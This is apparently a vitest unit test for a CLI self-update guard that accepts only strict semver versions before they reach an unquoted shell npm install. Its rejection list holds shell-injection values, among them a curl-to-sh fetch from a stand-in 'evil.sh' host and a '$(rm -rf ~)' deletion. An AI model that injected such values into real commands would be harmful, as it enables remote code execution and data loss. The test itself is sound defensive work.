/**
 * `cc update` self-update version guard. selfUpdateCli interpolates the target
 * version UNQUOTED into `npm install -g chainlesschain@<v>` via a shell, so the
 * version must be a strict semver (which can't contain shell metacharacters)
 * before it is used — defense-in-depth in addition to version-checker's gate.
 */

import { describe, it, expect } from "vitest";
import { isInstallableVersion } from "../../src/commands/update.js";

describe("isInstallableVersion", () => {
  it("accepts strict semver (incl. the CLI's npm versions, prerelease, build)", () => {
    for (const v of [
      "0.162.111",
      "5.0.3",
      "1.0.0-alpha.1",
      "1.0.0+build.7",
      "12.34.56",
    ]) {
      expect(isInstallableVersion(v)).toBe(true);
    }
  });

  it("rejects shell-injection payloads and junk", () => {
    for (const v of [
      "1.0.0; curl evil.sh | sh",
      "1.0.0$(rm -rf ~)",
      "1.0.0 && reboot",
      "`id`",
      "1.0.0 | tee x",
      "",
      "   ",
      null,
      undefined,
      42,
      "5.0.3.121", // 4-part product version is not a CLI npm semver
    ]) {
      expect(isInstallableVersion(v)).toBe(false);
    }
  });
});
